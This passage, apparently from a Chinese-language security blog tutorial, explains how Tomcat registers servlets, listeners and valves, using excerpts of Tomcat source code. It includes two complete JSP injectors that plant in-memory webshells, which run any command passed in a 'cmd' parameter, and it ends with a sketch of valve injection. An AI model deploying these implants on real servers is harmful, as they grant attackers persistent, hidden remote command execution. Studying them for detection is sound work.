<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.startup;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ContextConfig</span> <span class="keyword">implements</span> <span class="title class_">LifecycleListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">processClass</span><span class="params">(WebXml fragment, JavaClass clazz)</span> &#123;</span><br><span class="line">        AnnotationEntry[] annotationsEntries = clazz.getAnnotationEntries();</span><br><span class="line">        <span class="keyword">if</span> (annotationsEntries != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> clazz.getClassName();</span><br><span class="line">            <span class="keyword">for</span> (AnnotationEntry ae : annotationsEntries) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> ae.getAnnotationType();</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;Ljavax/servlet/annotation/WebServlet;&quot;</span>.equals(type)) &#123;</span><br><span class="line">                    processAnnotationWebServlet(className, ae, fragment); <span class="comment">// 处理解析到的WebServlet</span></span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;Ljavax/servlet/annotation/WebFilter;&quot;</span>.equals(type)) &#123;</span><br><span class="line">                    processAnnotationWebFilter(className, ae, fragment);</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;Ljavax/servlet/annotation/WebListener;&quot;</span>.equals(type)) &#123;</span><br><span class="line">                    fragment.addListener(className);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// Unknown annotation - ignore</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.startup;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ContextConfig</span> <span class="keyword">implements</span> <span class="title class_">LifecycleListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">package</span> org.apache.catalina.startup;<span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">processAnnotationWebServlet</span><span class="params">(String className,</span></span><br><span class="line"><span class="params">            AnnotationEntry ae, WebXml fragment)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (urlPatterns != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!fragment.getServletMappings().containsValue(servletName)) &#123;</span><br><span class="line">                <span class="keyword">for</span> (String urlPattern : urlPatterns) &#123;</span><br><span class="line">                    fragment.addServletMapping(urlPattern, servletName); <span class="comment">// 添加servlet映射</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.tomcat.util.descriptor.web;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebXml</span> <span class="keyword">extends</span> <span class="title class_">XmlEncodingBase</span> <span class="keyword">implements</span> <span class="title class_">DocumentProperties</span>.Encoding,</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addServletMappingDecoded</span><span class="params">(String urlPattern, String servletName)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">oldServletName</span> <span class="operator">=</span> servletMappings.put(urlPattern, servletName);</span><br><span class="line">        <span class="keyword">if</span> (oldServletName != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(sm.getString(</span><br><span class="line">                    <span class="string">&quot;webXml.duplicateServletMapping&quot;</span>, oldServletName,</span><br><span class="line">                    servletName, urlPattern));</span><br><span class="line">        &#125;</span><br><span class="line">        servletMappingNames.add(servletName); <span class="comment">// 添加servlet映射</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>总结</strong></p>
<ul>
<li>在<code>StandardContext</code>的<code>children</code>属性中加入我们定义的<code>wrapper</code></li>
<li>在<code>servletMappingNames</code>属性中加入我们的<code>servlet</code>映射</li>
<li>设置<code>servlet</code>的<code>loadOnStartup</code>属性值大于0</li>
</ul>
<h4 id="Servlet内存马实例"><a href="#Servlet内存马实例" class="headerlink" title="Servlet内存马实例"></a>Servlet内存马实例</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;AddServlet&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 从ServletContext中反射获取ApplicationContext和StandardContext</span></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">servletURL</span> <span class="operator">=</span> <span class="string">&quot;/cmdServlet&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> <span class="string">&quot;CmdServlet&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Servlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Servlet</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;cmd&quot;</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">                    out.println(output);</span><br><span class="line">                    out.flush();</span><br><span class="line">                    out.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建wrapper，设置我们的servlet</span></span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">        wrapper.setName(servletName);</span><br><span class="line">        wrapper.setServlet(servlet);</span><br><span class="line">        wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">        <span class="comment">// 令loadOnStartup大于0</span></span><br><span class="line">        wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 添加到children属性中</span></span><br><span class="line">        standardContext.addChild(wrapper);</span><br><span class="line">        <span class="comment">// 设置servlet映射</span></span><br><span class="line">        standardContext.addServletMappingDecoded(servletURL, servletName);</span><br><span class="line"></span><br><span class="line">        response.getWriter().write(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Listener内存马"><a href="#Listener内存马" class="headerlink" title="Listener内存马"></a>Listener内存马</h3><h4 id="Listener分类"><a href="#Listener分类" class="headerlink" title="Listener分类"></a>Listener分类</h4><ul>
<li><p>EventListener（修改属性时触发）</p>
<ul>
<li>ServletContextAttributeListener</li>
<li>ServletRequestAttributeListener</li>
<li>HttpSessionAttributeListener</li>
<li>ServletRequestAttributeListener</li>
</ul>
</li>
<li><p>LifecycleListener（在Servlet生命周期中触发）</p>
<ul>
<li>ServletContextListener</li>
<li>HttpSessionListener</li>
<li>ServletRequestListener</li>
</ul>
</li>
</ul>
<p><code>Listener</code>的种类有很多，但是有些不适用于作为内存马，比如<code>ServletContextListener</code>需要涉及到启动和停止服务器，<code>HttpSessionListener</code>需要设计<code>session</code>的创建和销毁，而<code>ServletRequestListener</code>只涉及到当前请求，所以最适合做内存马的是<code>ServletRequestListener</code></p>
<h4 id="listenerStart"><a href="#listenerStart" class="headerlink" title="listenerStart"></a>listenerStart</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.core;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StandardContext</span> <span class="keyword">extends</span> <span class="title class_">ContainerBase</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Context</span>, NotificationEmitter &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">startInternal</span><span class="params">()</span> <span class="keyword">throws</span> LifecycleException &#123;</span><br><span class="line">        </span><br><span class="line">        ...</span><br><span class="line">            <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!listenerStart()) &#123; <span class="comment">// 调用listenerStart()函数</span></span><br><span class="line">                    log.error(sm.getString(<span class="string">&quot;standardContext.listenerFail&quot;</span>));</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.core;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StandardContext</span> <span class="keyword">extends</span> <span class="title class_">ContainerBase</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Context</span>, NotificationEmitter &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">listenerStart</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled())</span><br><span class="line">            log.debug(<span class="string">&quot;Configuring application event listeners&quot;</span>);</span><br><span class="line"></span><br><span class="line">        String listeners[] = findApplicationListeners(); <span class="comment">// 找到全部Linstener名字</span></span><br><span class="line">        Object results[] = <span class="keyword">new</span> <span class="title class_">Object</span>[listeners.length];</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">ok</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; results.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (getLogger().isDebugEnabled())</span><br><span class="line">                getLogger().debug(<span class="string">&quot; Configuring event listener class &#x27;&quot;</span> +</span><br><span class="line">                    listeners[i] + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">listener</span> <span class="operator">=</span> listeners[i];</span><br><span class="line">                results[i] = getInstanceManager().newInstance(listener); <span class="comment">// 实例化Linstener</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                t = ExceptionUtils.unwrapInvocationTargetException(t);</span><br><span class="line">                ExceptionUtils.handleThrowable(t);</span><br><span class="line">                getLogger().error(sm.getString(</span><br><span class="line">                        <span class="string">&quot;standardContext.applicationListener&quot;</span>, listeners[i]), t);</span><br><span class="line">                ok = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!ok) &#123;</span><br><span class="line">            getLogger().error(sm.getString(<span class="string">&quot;standardContext.applicationSkipped&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        List&lt;Object&gt; eventListeners = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        List&lt;Object&gt; lifecycleListeners = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Object result : results) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((result <span class="keyword">instanceof</span> ServletContextAttributeListener)</span><br><span class="line">                    || (result <span class="keyword">instanceof</span> ServletRequestAttributeListener)</span><br><span class="line">                    || (result <span class="keyword">instanceof</span> ServletRequestListener)</span><br><span class="line">                    || (result <span class="keyword">instanceof</span> HttpSessionIdListener)</span><br><span class="line">                    || (result <span class="keyword">instanceof</span> HttpSessionAttributeListener)) &#123;</span><br><span class="line">                eventListeners.add(result);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((result <span class="keyword">instanceof</span> ServletContextListener)</span><br><span class="line">                    || (result <span class="keyword">instanceof</span> HttpSessionListener)) &#123;</span><br><span class="line">                lifecycleListeners.add(result); <span class="comment">// 把Linstener加入到lifecycleListeners</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        eventListeners.addAll(Arrays.asList(getApplicationEventListeners()));</span><br><span class="line">        setApplicationEventListeners(eventListeners.toArray());</span><br><span class="line">        <span class="keyword">for</span> (Object lifecycleListener: getApplicationLifecycleListeners()) &#123;</span><br><span class="line">            lifecycleListeners.add(lifecycleListener);</span><br><span class="line">            <span class="keyword">if</span> (lifecycleListener <span class="keyword">instanceof</span> ServletContextListener) &#123;</span><br><span class="line">                noPluggabilityListeners.add(lifecycleListener);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        setApplicationLifecycleListeners(lifecycleListeners.toArray());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (getLogger().isDebugEnabled())</span><br><span class="line">            getLogger().debug(<span class="string">&quot;Sending application start events&quot;</span>);</span><br><span class="line"></span><br><span class="line">        getServletContext();</span><br><span class="line">        context.setNewServletContextListenerAllowed(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        Object instances[] = getApplicationLifecycleListeners();</span><br><span class="line">        <span class="keyword">if</span> (instances == <span class="literal">null</span> || instances.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ok;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ServletContextEvent</span> <span class="variable">event</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletContextEvent</span>(getServletContext()); <span class="comment">// 获取ServletContextEvent</span></span><br><span class="line">        <span class="type">ServletContextEvent</span> <span class="variable">tldEvent</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (noPluggabilityListeners.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            noPluggabilityServletContext = <span class="keyword">new</span> <span class="title class_">NoPluggabilityServletContext</span>(getServletContext());</span><br><span class="line">            tldEvent = <span class="keyword">new</span> <span class="title class_">ServletContextEvent</span>(noPluggabilityServletContext);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (Object instance : instances) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!(instance <span class="keyword">instanceof</span> ServletContextListener)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">ServletContextListener</span> <span class="variable">listener</span> <span class="operator">=</span> (ServletContextListener) instance;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fireContainerEvent(<span class="string">&quot;beforeContextInitialized&quot;</span>, listener);</span><br><span class="line">                <span class="keyword">if</span> (noPluggabilityListeners.contains(listener)) &#123;</span><br><span class="line">                    listener.contextInitialized(tldEvent);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    listener.contextInitialized(event); <span class="comment">// 调用Linstener的contextInitialized()函数</span></span><br><span class="line">                &#125;</span><br><span class="line">                fireContainerEvent(<span class="string">&quot;afterContextInitialized&quot;</span>, listener);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                ExceptionUtils.handleThrowable(t);</span><br><span class="line">                fireContainerEvent(<span class="string">&quot;afterContextInitialized&quot;</span>, listener);</span><br><span class="line">                getLogger().error(sm.getString(<span class="string">&quot;standardContext.listenerStart&quot;</span>,</span><br><span class="line">                        instance.getClass().getName()), t);</span><br><span class="line">                ok = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ok;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以这里的重点在于我们怎么把<code>Linstener</code>添加到<code>applicationListeners</code>属性中，通过属性调用找到了<code>addApplicationListener()</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.core;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StandardContext</span> <span class="keyword">extends</span> <span class="title class_">ContainerBase</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Context</span>, NotificationEmitter &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addApplicationListener</span><span class="params">(String listener)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">synchronized</span> (applicationListenersLock) &#123;</span><br><span class="line">            String results[] = <span class="keyword">new</span> <span class="title class_">String</span>[applicationListeners.length + <span class="number">1</span>]; <span class="comment">// 获取Listener名字</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; applicationListeners.length; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (listener.equals(applicationListeners[i])) &#123;</span><br><span class="line">                    log.info(sm.getString(<span class="string">&quot;standardContext.duplicateListener&quot;</span>,listener));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                results[i] = applicationListeners[i];</span><br><span class="line">            &#125;</span><br><span class="line">            results[applicationListeners.length] = listener;</span><br><span class="line">            applicationListeners = results; <span class="comment">// 传入我们的Linstenr</span></span><br><span class="line">        &#125;</span><br><span class="line">        fireContainerEvent(<span class="string">&quot;addApplicationListener&quot;</span>, listener);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>总结</strong></p>
<ul>
<li>直接调用<code>addApplicationListener</code>将我们的<code>Listener</code>添加到<code>StandardContext</code>的<code>applicationListeners</code>属性中</li>
</ul>
<h4 id="Listener内存马实例"><a href="#Listener内存马实例" class="headerlink" title="Listener内存马实例"></a>Listener内存马实例</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;AddLinstener&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 从ServletContext中反射获取ApplicationContext和StandardContext</span></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">        <span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                        <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                        requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request)requestF.get(req);</span><br><span class="line">                        PrintWriter out= request.getResponse().getWriter();</span><br><span class="line">                        out.println(output);</span><br><span class="line">                        out.flush();</span><br><span class="line">                        out.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;&#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        standardContext.addApplicationEventListener(listener);</span><br><span class="line"></span><br><span class="line">        response.getWriter().write(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Valve内存马"><a href="#Valve内存马" class="headerlink" title="Valve内存马"></a>Valve内存马</h3><h4 id="Pineline"><a href="#Pineline" class="headerlink" title="Pineline"></a>Pineline</h4><p>在上面的Tomcat执行流程中讲到过<code>Pineline</code>的调用链，每一层的<code>valve</code>都会顺序调用，上层的<code>valve</code>会调用下层的<code>valve</code>，然后每次调用<code>valve</code>的<code>invoke()</code>方法</p>
<p>比如在<code>StandardHostValve</code>类中是这样调用<code>vavle</code>的<code>invoke()</code>方法的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> request.getContext(); <span class="comment">// 获取StandardContext</span></span><br><span class="line">...</span><br><span class="line">context.getPipeline().getFirst().invoke(request, response); <span class="comment">// 获取StandardContext的Valve</span></span><br></pre></td></tr></table></figure>

<p>然后在每一个<code>invoke()</code>里面又会递归调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getNext().invoke(request, response); <span class="comment">// 获取StandardContext的下一个Valve</span></span><br></pre></td></tr></table></figure>

<p>所以我们只需在<code>standardContext</code>中添加我们的<code>valve</code>，即可注入<code>Valve</code>内存马</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">standardContext.getPipeline().addValve(valve);</span><br></pre></td></tr></table></figure>

